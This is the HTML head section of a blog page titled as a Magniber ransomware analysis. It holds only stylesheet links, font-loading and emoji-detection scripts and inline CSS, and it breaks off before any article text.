<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>
Magniber ransomware analysis: Tiny Tracer in action | hasherezade&#039;s 1001 nights</title>
<link rel="profile" href="https://gmpg.org/xfn/11" />
<link rel="stylesheet" type="text/css" media="all" href="https://s2.wp.com/wp-content/themes/pub/twentyten/style.css?ver=20190507" />
<link rel="pingback" href="https://hshrzd.wordpress.com/xmlrpc.php">
<script type="text/javascript">
  WebFontConfig = {"google":{"families":["Roboto+Slab:r:latin,latin-ext","Karla:r,i,b,bi:latin,latin-ext"]},"api_url":"https:\/\/fonts-api.wp.com\/css"};
  (function() {
    var wf = document.createElement('script');
    wf.src = 'https://s0.wp.com/wp-content/plugins/custom-fonts/js/webfont.js';
    wf.type = 'text/javascript';
    wf.async = 'true';
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(wf, s);
	})();
</script><style id="jetpack-custom-fonts-css">.wf-active #site-title{font-family:"Roboto Slab",serif;font-style:normal;font-weight:400}.wf-active #site-title{font-style:normal;font-weight:400}.wf-active #site-title a{font-weight:400;font-style:normal}.wf-active .pingback a.url, .wf-active body{font-family:"Karla",sans-serif}.wf-active #cancel-comment-reply-link, .wf-active #site-info, .wf-active #wp-calendar, .wf-active .comment-body thead th, .wf-active .comment-body tr th, .wf-active .comment-meta, .wf-active .entry-content label, .wf-active .entry-content thead th, .wf-active .entry-content tr th, .wf-active .entry-meta, .wf-active .entry-utility, .wf-active .form-allowed-tags, .wf-active .pingback p, .wf-active .reply, .wf-active .wp-caption-text{font-family:"Karla",sans-serif}.wf-active h1, .wf-active h2, .wf-active h3, .wf-active h4, .wf-active h5, .wf-active h6{font-weight:400;font-family:"Roboto Slab",serif;font-style:normal}.wf-active .page-title span{font-family:"Roboto Slab",serif;font-style:normal;font-weight:400}.wf-active #access .menu, .wf-active #access div.menu ul, .wf-active #respond label, .wf-active .entry-title, .wf-active .navigation, .wf-active .page-title, .wf-active .widget-title, .wf-active h3#comments-title, .wf-active h3#reply-title{font-family:"Roboto Slab",serif;font-style:normal;font-weight:400}.wf-active #access .menu-header, .wf-active div.menu{font-style:normal;font-weight:400}.wf-active .page-title{font-weight:400;font-style:normal}.wf-active .page-title span{font-style:normal;font-weight:400}.wf-active #content .entry-title{font-weight:400;font-style:normal}.wf-active .navigation{font-style:normal;font-weight:400}.wf-active h3#comments-title, .wf-active h3#reply-title{font-weight:400;font-style:normal}.wf-active #respond label{font-style:normal;font-weight:400}.wf-active .widget-title{font-weight:400;font-style:normal}</style>
<meta name='robots' content='max-image-preview:large' />
<link rel='dns-prefetch' href='//s0.wp.com' />
<link rel='dns-prefetch' href='//s2.wp.com' />
<link rel='dns-prefetch' href='//s1.wp.com' />
<link rel='dns-prefetch' href='//widgets.wp.com' />
<link rel="alternate" type="application/rss+xml" title="hasherezade&#039;s 1001 nights &raquo; Feed" href="https://hshrzd.wordpress.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="hasherezade&#039;s 1001 nights &raquo; Comments Feed" href="https://hshrzd.wordpress.com/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="hasherezade&#039;s 1001 nights &raquo; Magniber ransomware analysis: Tiny Tracer in&nbsp;action Comments Feed" href="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/feed/" />
	<script type="text/javascript">
		/* <![CDATA[ */
		function addLoadEvent(func) {
			var oldonload = window.onload;
			if (typeof window.onload != 'function') {
				window.onload = func;
			} else {
				window.onload = function () {
					oldonload();
					func();
				}
			}
		}
		/* ]]> */
	</script>
	<script type="text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s0.wp.com\/wp-content\/mu-plugins\/wpcom-smileys\/twemoji\/2\/72x72\/","ext":".png","svgUrl":"https:\/\/s0.wp.com\/wp-content\/mu-plugins\/wpcom-smileys\/twemoji\/2\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/s2.wp.com\/wp-includes\/js\/wp-emoji-release.min.js?m=1719498190i&ver=6.8-alpha-59438"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<link crossorigin='anonymous' rel='stylesheet' id='all-css-0-1' href='https://s1.wp.com/_static/??-eJxtzFsKgCAQheENZaMg+BStRXQI80oz0vbDCILo5cAHhx/OJlwtjIUhd9FS30Ih2JGbdfEx5FrH+J6Q4MBkGb1olfij2RFN8J9MIeIbvjXua16UUUZLLY3eL2BkNNM=&cssminify=yes' type='text/css' media='all' />
<style id='wp-emoji-styles-inline-css'>

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link crossorigin='anonymous' rel='stylesheet' id='all-css-2-1' href='https://s1.wp.com/_static/??-eJyljkEOwiAQRS8kjC0m6sJ4FqATpFIgM4OG21vdmLhq4vLn5b18eFblSxbMAjW1EDNDaOt0SGElhPAYzvqk9+BaTBO4VPxdpejIUgeWnlB75h38F5IbLltCH4thRqn2rdtemqhAcdr85SdBVmIO/NWvy2U4GmPGgxnN/AKJpmpc&cssminify=yes' type='text/css' media='all' />
<style id='wp-block-library-inline-css'>
.has-text-align-justify {
	text-align:justify;
}
.has-text-align-justify{text-align:justify;}
</style>
<link crossorigin='anonymous' rel='stylesheet' id='all-css-4-1' href='https://s2.wp.com/_static/??-eJzTLy/QzcxLzilNSS3WzyrWz01NyUxMzUnNTc0rQeEU5CRWphbp5qSmJyZX6uVm5uklFxfr6OPTDpRD5sM02efaGpoZmFkYGRuZGmQBAHPvL0Y=&cssminify=yes' type='text/css' media='all' />
<style id='jetpack-sharing-buttons-style-inline-css'>
.jetpack-sharing-buttons__services-list{display:flex;flex-direction:row;flex-wrap:wrap;gap:0;list-style-type:none;margin:5px;padding:0}.jetpack-sharing-buttons__services-list.has-small-icon-size{font-size:12px}.jetpack-sharing-buttons__services-list.has-normal-icon-size{font-size:16px}.jetpack-sharing-buttons__services-list.has-large-icon-size{font-size:24px}.jetpack-sharing-buttons__services-list.has-huge-icon-size{font-size:36px}@media print{.jetpack-sharing-buttons__services-list{display:none!important}}.editor-styles-wrapper .wp-block-jetpack-sharing-buttons{gap:0;padding-inline-start:0}ul.jetpack-sharing-buttons__services-list.has-background{padding:1.25em 2.375em}
</style>
<link crossorigin='anonymous' rel='stylesheet' id='all-css-6-1' href='https://s2.wp.com/wp-content/plugins/coblocks/2.18.1-simple-rev.4/dist/coblocks-style.css?m=1681832297i&cssminify=yes' type='text/css' media='all' />
<style id='classic-theme-styles-inline-css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<link crossorigin='anonymous' rel='stylesheet' id='all-css-8-1' href='https://s1.wp.com/_static/??/wp-content/mu-plugins/core-compat/wp-mediaelement.css,/wp-content/mu-plugins/wpcom-bbpress-premium-themes.css?m=1432920480j&cssminify=yes' type='text/css' media='all' />
<style id='global-styles-inline-css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #fff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--color--blue: #0066cc;--wp--preset--color--medium-gray: #666;--wp--preset--color--light-gray: #f1f1f1;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--font-family--albert-sans: 'Albert Sans', sans-serif;--wp--preset--font-family--alegreya: Alegreya, serif;--wp--preset--font-family--arvo: Arvo, serif;--wp--preset--font-family--bodoni-moda: 'Bodoni Moda', serif;--wp--preset--font-family--bricolage-grotesque: 'Bricolage Grotesque', sans-serif;--wp--preset--font-family--cabin: Cabin, sans-serif;--wp--preset--font-family--chivo: Chivo, sans-serif;--wp--preset--font-family--commissioner: Commissioner, sans-serif;--wp--preset--font-family--cormorant: Cormorant, serif;--wp--preset--font-family--courier-prime: 'Courier Prime', monospace;--wp--preset--font-family--crimson-pro: 'Crimson Pro', serif;--wp--preset--font-family--dm-mono: 'DM Mono', monospace;--wp--preset--font-family--dm-sans: 'DM Sans', sans-serif;--wp--preset--font-family--dm-serif-display: 'DM Serif Display', serif;--wp--preset--font-family--domine: Domine, serif;--wp--preset--font-family--eb-garamond: 'EB Garamond', serif;--wp--preset--font-family--epilogue: Epilogue, sans-serif;--wp--preset--font-family--fahkwang: Fahkwang, sans-serif;--wp--preset--font-family--figtree: Figtree, sans-serif;--wp--preset--font-family--fira-sans: 'Fira Sans', sans-serif;--wp--preset--font-family--fjalla-one: 'Fjalla One', sans-serif;--wp--preset--font-family--fraunces: Fraunces, serif;--wp--preset--font-family--gabarito: Gabarito, system-ui;--wp--preset--font-family--ibm-plex-mono: 'IBM Plex Mono', monospace;--wp--preset--font-family--ibm-plex-sans: 'IBM Plex Sans', sans-serif;--wp--preset--font-family--ibarra-real-nova: 'Ibarra Real Nova', serif;--wp--preset--font-family--instrument-serif: 'Instrument Serif', serif;--wp--preset--font-family--inter: Inter, sans-serif;--wp--preset--font-family--josefin-sans: 'Josefin Sans', sans-serif;--wp--preset--font-family--jost: Jost, sans-serif;--wp--preset--font-family--libre-baskerville: 'Libre Baskerville', serif;--wp--preset--font-family--libre-franklin: 'Libre Franklin', sans-serif;--wp--preset--font-family--literata: Literata, serif;--wp--preset--font-family--lora: Lora, serif;--wp--preset--font-family--merriweather: Merriweather, serif;--wp--preset--font-family--montserrat: Montserrat, sans-serif;--wp--preset--font-family--newsreader: Newsreader, serif;--wp--preset--font-family--noto-sans-mono: 'Noto Sans Mono', sans-serif;--wp--preset--font-family--nunito: Nunito, sans-serif;--wp--preset--font-family--open-sans: 'Open Sans', sans-serif;--wp--preset--font-family--overpass: Overpass, sans-serif;--wp--preset--font-family--pt-serif: 'PT Serif', serif;--wp--preset--font-family--petrona: Petrona, serif;--wp--preset--font-family--piazzolla: Piazzolla, serif;--wp--preset--font-family--playfair-display: 'Playfair Display', serif;--wp--preset--font-family--plus-jakarta-sans: 'Plus Jakarta Sans', sans-serif;--wp--preset--font-family--poppins: Poppins, sans-serif;--wp--preset--font-family--raleway: Raleway, sans-serif;--wp--preset--font-family--roboto: Roboto, sans-serif;--wp--preset--font-family--roboto-slab: 'Roboto Slab', serif;--wp--preset--font-family--rubik: Rubik, sans-serif;--wp--preset--font-family--rufina: Rufina, serif;--wp--preset--font-family--sora: Sora, sans-serif;--wp--preset--font-family--source-sans-3: 'Source Sans 3', sans-serif;--wp--preset--font-family--source-serif-4: 'Source Serif 4', serif;--wp--preset--font-family--space-mono: 'Space Mono', monospace;--wp--preset--font-family--syne: Syne, sans-serif;--wp--preset--font-family--texturina: Texturina, serif;--wp--preset--font-family--urbanist: Urbanist, sans-serif;--wp--preset--font-family--work-sans: 'Work Sans', sans-serif;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}.has-albert-sans-font-family{font-family: var(--wp--preset--font-family--albert-sans) !important;}.has-alegreya-font-family{font-family: var(--wp--preset--font-family--alegreya) !important;}.has-arvo-font-family{font-family: var(--wp--preset--font-family--arvo) !important;}.has-bodoni-moda-font-family{font-family: var(--wp--preset--font-family--bodoni-moda) !important;}.has-bricolage-grotesque-font-family{font-family: var(--wp--preset--font-family--bricolage-grotesque) !important;}.has-cabin-font-family{font-family: var(--wp--preset--font-family--cabin) !important;}.has-chivo-font-family{font-family: var(--wp--preset--font-family--chivo) !important;}.has-commissioner-font-family{font-family: var(--wp--preset--font-family--commissioner) !important;}.has-cormorant-font-family{font-family: var(--wp--preset--font-family--cormorant) !important;}.has-courier-prime-font-family{font-family: var(--wp--preset--font-family--courier-prime) !important;}.has-crimson-pro-font-family{font-family: var(--wp--preset--font-family--crimson-pro) !important;}.has-dm-mono-font-family{font-family: var(--wp--preset--font-family--dm-mono) !important;}.has-dm-sans-font-family{font-family: var(--wp--preset--font-family--dm-sans) !important;}.has-dm-serif-display-font-family{font-family: var(--wp--preset--font-family--dm-serif-display) !important;}.has-domine-font-family{font-family: var(--wp--preset--font-family--domine) !important;}.has-eb-garamond-font-family{font-family: var(--wp--preset--font-family--eb-garamond) !important;}.has-epilogue-font-family{font-family: var(--wp--preset--font-family--epilogue) !important;}.has-fahkwang-font-family{font-family: var(--wp--preset--font-family--fahkwang) !important;}.has-figtree-font-family{font-family: var(--wp--preset--font-family--figtree) !important;}.has-fira-sans-font-family{font-family: var(--wp--preset--font-family--fira-sans) !important;}.has-fjalla-one-font-family{font-family: var(--wp--preset--font-family--fjalla-one) !important;}.has-fraunces-font-family{font-family: var(--wp--preset--font-family--fraunces) !important;}.has-gabarito-font-family{font-family: var(--wp--preset--font-family--gabarito) !important;}.has-ibm-plex-mono-font-family{font-family: var(--wp--preset--font-family--ibm-plex-mono) !important;}.has-ibm-plex-sans-font-family{font-family: var(--wp--preset--font-family--ibm-plex-sans) !important;}.has-ibarra-real-nova-font-family{font-family: var(--wp--preset--font-family--ibarra-real-nova) !important;}.has-instrument-serif-font-family{font-family: var(--wp--preset--font-family--instrument-serif) !important;}.has-inter-font-family{font-family: var(--wp--preset--font-family--inter) !important;}.has-josefin-sans-font-family{font-family: var(--wp--preset--font-family--josefin-sans) !important;}.has-jost-font-family{font-family: var(--wp--preset--font-family--jost) !important;}.has-libre-baskerville-font-family{font-family: var(--wp--preset--font-family--libre-baskerville) !important;}.has-libre-franklin-font-family{font-family: var(--wp--preset--font-family--libre-franklin) !important;}.has-literata-font-family{font-family: var(--wp--preset--font-family--literata) !important;}.has-lora-font-family{font-family: var(--wp--preset--font-family--lora) !important;}.has-merriweather-font-family{font-family: var(--wp--preset--font-family--merriweather) !important;}.has-montserrat-font-family{font-family: var(--wp--preset--font-family--montserrat) !important;}.has-newsreader-font-family{font-family: var(--wp--preset--font-family--newsreader) !important;}.has-noto-sans-mono-font-family{font-family: var(--wp--preset--font-family--noto-sans-mono) !important;}.has-nunito-font-family{font-family: var(--wp--preset--font-family--nunito) !important;}.has-open-sans-font-family{font-family: var(--wp--preset--font-family--open-sans) !important;}.has-overpass-font-family{font-family: var(--wp--preset--font-family--overpass) !important;}.has-pt-serif-font-family{font-family: var(--wp--preset--font-family--pt-serif) !important;}.has-petrona-font-family{font-family: var(--wp--preset--font-family--petrona) !important;}.has-piazzolla-font-family{font-family: var(--wp--preset--font-family--piazzolla) !important;}.has-playfair-display-font-family{font-family: var(--wp--preset--font-family--playfair-display) !important;}.has-plus-jakarta-sans-font-family{font-family: var(--wp--preset--font-family--plus-jakarta-sans) !important;}.has-poppins-font-family{font-family: var(--wp--preset--font-family--poppins) !important;}.has-raleway-font-family{font-family: var(--wp--preset--font-family--raleway) !important;}.has-roboto-font-family{font-family: var(--wp--preset--font-family--roboto) !important;}.has-roboto-slab-font-family{font-family: var(--wp--preset--font-family--roboto-slab) !important;}.has-rubik-font-family{font-family: var(--wp--preset--font-family--rubik) !important;}.has-rufina-font-family{font-family: var(--wp--preset--font-family--rufina) !important;}.has-sora-font-family{font-family: var(--wp--preset--font-family--sora) !important;}.has-source-sans-3-font-family{font-family: var(--wp--preset--font-family--source-sans-3) !important;}.has-source-serif-4-font-family{font-family: var(--wp--preset--font-family--source-serif-4) !important;}.has-space-mono-font-family{font-family: var(--wp--preset--font-family--space-mono) !important;}.has-syne-font-family{font-family: var(--wp--preset--font-family--syne) !important;}.has-texturina-font-family{font-family: var(--wp--preset--font-family--texturina) !important;}.has-urbanist-font-family{font-family: var(--wp--preset--font-family--urbanist) !important;}.has-work-sans-font-family{font-family: var(--wp--preset--font-family--work-sans) !important;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
</style>
<link crossorigin='anonymous' rel='stylesheet' id='all-css-10-1' href='https://s2.wp.com/wp-content/mu-plugins/jetpack-mu-wpcom-plugin/moon/vendor/automattic/jetpack-mu-wpcom/src/build/verbum-comments/verbum-comments.css?m=1729082728i&cssminify=yes' type='text/css' media='all' />
<link rel='stylesheet' id='verbum-gutenberg-css-css' href='https://widgets.wp.com/verbum-block-editor/block-editor.css?ver=1721244820' media='all' />
<link crossorigin='anonymous' rel='stylesheet' id='all-css-12-1' href='https://s1.wp.com/_static/??-eJyFjsEOwjAMQ3+IECaxiR0Q37JVoRTaplpSVfv7hRsTEtxsy88ytgKOs1JW1AclEix1Rm0WrJbiHNm95OhEDvivK7pGglYcpy8gVSix+pAFF7JRb9KjtT7sL8gTg12ZNHDeGbjHKSxv9Jau3dCdzv3YX8bnBqh7UWU=&cssminify=yes' type='text/css' media='all' />
<style id='jetpack-global-styles-frontend-style-inline-css'>
:root { --font-headings: unset; --font-base: unset; --font-headings-default: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif; --font-base-default: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif;}
</style>
<link crossorigin='anonymous' rel='stylesheet' id='all-css-14-1' href='https://s2.wp.com/_static/??-eJyNjcEKwjAQRH/IuA1aehI/ReImJKmb3eAmFP9eW3oRL16GeTC8gaUaFG6BG5RuKvWYWWEOrTp87AxFZA3fKShocs/gnfevrWaOR1Q9wP+mW2YEFcyODEkU/YIfW0uhfH7TGSLJ3dE6uJaLneww2mkYT/MbUOlJHA==&cssminify=yes' type='text/css' media='all' />
<script type="text/javascript" id="jetpack_related-posts-js-extra">
/* <![CDATA[ */
var related_posts_js_options = {"post_heading":"h4"};
/* ]]> */
</script>
<script type="text/javascript" id="wpcom-actionbar-placeholder-js-extra">
/* <![CDATA[ */
